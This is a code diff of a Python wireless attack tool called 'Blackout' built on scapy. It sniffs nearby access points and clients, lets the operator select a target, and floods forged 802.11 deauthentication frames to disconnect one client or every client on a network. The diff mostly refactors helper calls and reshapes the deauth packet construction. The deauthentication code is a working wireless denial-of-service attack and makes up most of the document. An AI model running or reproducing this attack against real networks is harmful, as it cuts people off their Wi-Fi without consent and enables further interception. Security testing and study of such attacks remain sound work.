@@ -43,14 +43,12 @@ class Blackout:
         # Set curses screen object
         self.screen, self.window = Blackout.start_curses()
 
-        self.utils = Utils(interface)
-
         # Set scapy sniff interface
         conf.iface = interface
         self.iface = interface
 
         # Compile list of vendors
-        self.vendors = Utils.compile_vendors()
+        self.vendors = compile_vendors()
 
         self.ap_dict = dict()
         self.ap_clients = dict()
@@ -58,8 +56,8 @@ class Blackout:
         self.lock = Lock()
 
         self.main_display = TriggerList(self.update_display)
-        self.target_ap = None
-        self.target_bssid = None
+        self.target_ap = dict()
+        # self.target_bssid = None
         self.target_client = None
         self.target_id = None
 
@@ -156,11 +154,11 @@ class Blackout:
         self.refresh_screen()
 
     def interface_setup(self):
-        self.main_display.append(f"[+] Putting {self.iface} into MONITOR mode...\n")
-        self.main_display.append(f"[+] Stopping any interfering processes...\n")
+        self.output(f"[+] Putting {self.iface} into MONITOR mode...\n")
+        self.output(f"[+] Stopping any interfering processes...\n")
 
         try:
-            status = self.utils.start_mon()
+            status = start_mon(self.iface)
             if status is False:
                 raise Exception(f"[!!] Could not put {self.iface} into MONITOR mode")
         except Exception as e:
@@ -179,7 +177,7 @@ class Blackout:
 
         self.output("[+] Sniffing Access Points on all channels\n")
         self.output("[+] Press 's' to select a target. 'q' to quit\n")
-        self.output(Utils.print_headers())
+        self.output(print_headers())
 
         self.sniff_ap_thread.start()
         self.sniff_clients_thread.start()
@@ -206,7 +204,7 @@ class Blackout:
 
     def show_summary(self, client=False):
         # Output a very simple summary of findings
-        self.output(Utils.horizontal_rule(30))
+        self.output(horizontal_rule(30))
         if client:
             self.output(f"Clients discovered: {len(self.ap_clients)}\n\n")
         else:
@@ -235,7 +233,7 @@ class Blackout:
 
     def select_target(self, client=False):
         self.target_id = None
-        self.output(Utils.horizontal_rule(30))
+        self.output(horizontal_rule(30))
         self.output(f"\n[?] Enter ID of the {'client' if client else 'AP'} you wish to target: ")
 
         # TODO: There may be a better way
@@ -248,22 +246,22 @@ class Blackout:
         if client:
             self.target_client = self.ap_dict[self.target_ap]['clients'][self.target_id-1]
         else:
-            self.target_ap = [ap for ap in self.ap_dict if self.ap_dict[ap]['ap_id'] == self.target_id]
+            self.target_ap = [ap for ap in self.ap_dict if self.ap_dict[ap]['id'] == self.target_id][0]
             self.display_ap_details()
 
     def display_client_details(self):
-        self.output(Utils.horizontal_rule(30))
+        self.output(horizontal_rule(30))
         self.output(f"Targeting Client: [{self.target_client}]\n")
-        self.output(Utils.horizontal_rule(30))
+        self.output(horizontal_rule(30))
 
     def display_ap_details(self):
         outputs = [
-            Utils.horizontal_rule(30),
+            horizontal_rule(30),
             f"\nSelected Access Point [{self.target_id}]\n",
-            f"\tssid:\t\t{self.target_ap['ssid']}\n",
-            f"\tbssid:\t\t{self.target_ap['bssid']}\n",
-            f"\tchannel:\t\t{self.target_ap['channel']}\n",
-            Utils.horizontal_rule(30)]
+            f"\tssid:\t\t{self.ap_dict[self.target_ap]['ssid']}\n",
+            f"\tbssid:\t\t{self.target_ap}\n",
+            f"\tchannel:\t\t{self.ap_dict[self.target_ap]['channel']}\n",
+            horizontal_rule(30)]
 
         for line in outputs:
             self.output(line)
@@ -282,7 +280,7 @@ class Blackout:
             self.start_deauth()
 
         except Exception as e:
-            Utils.log_error_to_file(traceback.format_exc())
+            log_error_to_file(traceback.format_exc())
             self.error(e)
 
         except KeyboardInterrupt:
@@ -296,16 +294,13 @@ class Blackout:
         """
         create deauth packets and send them to the target AP
         """
-
-        bssid, channel = self.target_ap['bssid'], self.target_ap['channel']
-
         self.deauth_active = True
+        channel = str(self.ap_dict[self.target_ap]['channel'])
 
-        target_mac = None
         if deauth_all:
-            self.output(f"\n[*] Deauthenticating ALL clients from {bssid} on channel {channel}...\n")
+            self.output(f"\n[*] Deauthenticating ALL clients from {self.target_ap} on channel {channel}...\n")
         else:
-            self.output(f"[*] Deauth {self.target_client} from {bssid} on channel {channel}...\n")
+            self.output(f"[*] Deauth {self.target_client} from {self.target_ap} on channel {channel}...\n")
 
         self.output("[*] Press 's' to stop. 'q' to quit.\n")
 
@@ -320,24 +315,47 @@ class Blackout:
 
             if deauth_all:
                 deauth_to_bcast = Dot11(
-                    type=0, subtype=12, addr1=BROADCAST_ADDR, addr2=bssid, addr3=bssid) / Dot11Deauth()
+                    type=0,
+                    subtype=12,
+                    addr1=BROADCAST_ADDR,
+                    addr2=self.target_ap,
+                    addr3=self.target_ap)/Dot11Deauth()
+
                 packets.append(deauth_to_bcast)
 
                 with self.lock:
-                    for client in self.target_ap['clients']:
+                    for client in self.ap_dict[self.target_ap]['clients']:
                         deauth_to = Dot11(
-                        type=0, subtype=12, addr1=client, addr2=bssid, addr3=bssid) / Dot11Deauth()
+                            type=0,
+                            subtype=12,
+                            addr1=client,
+                            addr2=self.target_ap,
+                            addr3=self.target_ap)/Dot11Deauth()
 
                         deauth_from = Dot11(
-                        type=0, subtype=12, addr1=bssid, addr2=client, addr3=client) / Dot11Deauth()
+                            type=0,
+                            subtype=12,
+                            addr1=self.target_ap,
+                            addr2=client,
+                            addr3=client)/Dot11Deauth()
 
                         packets.extend([deauth_to, deauth_from])
 
             else:
                 deauth_to_client = Dot11(
-                    type=0, subtype=12, addr1=self.target_client, addr2=bssid, addr3=bssid) / Dot11Deauth()
+                    type=0,
+                    subtype=12,
+                    addr1=self.target_client,
+                    addr2=self.target_ap,
+                    addr3=self.target_ap)/Dot11Deauth()
+
                 deauth_to_ap = Dot11(
-                    type=0, subtype=12, addr1=bssid, addr2=self.target_client, addr3=self.target_client) / Dot11Deauth()
+                    type=0,
+                    subtype=12,
+                    addr1=self.target_ap,
+                    addr2=self.target_client,
+                    addr3=self.target_client)/Dot11Deauth()
+
                 packets.extend([deauth_to_ap, deauth_to_client])
 
             # create deauth packet for AP and add to list
@@ -366,6 +384,7 @@ class Blackout:
 
         except Exception as e:
             self.error(e)
+            log_error_to_file(traceback.format_exc())
 
     def sniff_access_points(self, pkt):
         """
@@ -428,7 +447,7 @@ class Blackout:
             if "ord" in f"{e}":  # TODO This may be to do with 5GHz channels cropping up?
                 pass
             else:
-                Utils.log_error_to_file(traceback.format_exc())
+                log_error_to_file(traceback.format_exc())
                 self.error(e)
 
     def add_client(self, access_point, new_client):
@@ -531,7 +550,7 @@ class Blackout:
         self.to_window(f"[!!] Putting {self.iface} back into MANAGED mode...")
 
         try:
-            status = self.utils.stop_mon()
+            status = stop_mon(self.iface)
             if not status:
                 raise Exception("[!] Error putting {self.iface} into MANAGED mode")
 
@@ -556,7 +575,8 @@ class Blackout:
         self.exit_application()
 
     def error(self, error):
-        self.main_display.append(f"[!] Error: {error}\n")
+        self.output(f"[!] Error: {error}\n")
+        log_error_to_file(traceback.format_exc())
 
     def output(self, msg):
         self.main_display.append(msg)
@@ -591,6 +611,10 @@ class Blackout:
 
 if __name__ == "__main__":
 
+    # Clear log file
+    with open('log', 'w') as f:
+        f.write('')
+
     blackout = Blackout("wlan0")
 
     # Set the signal handler
@@ -599,6 +623,6 @@ if __name__ == "__main__":
     try:
         blackout.run()
     except Exception as e:
-        Utils.log_error_to_file(traceback.format_exc())
+        log_error_to_file(traceback.format_exc())
     except KeyboardInterrupt:
         pass
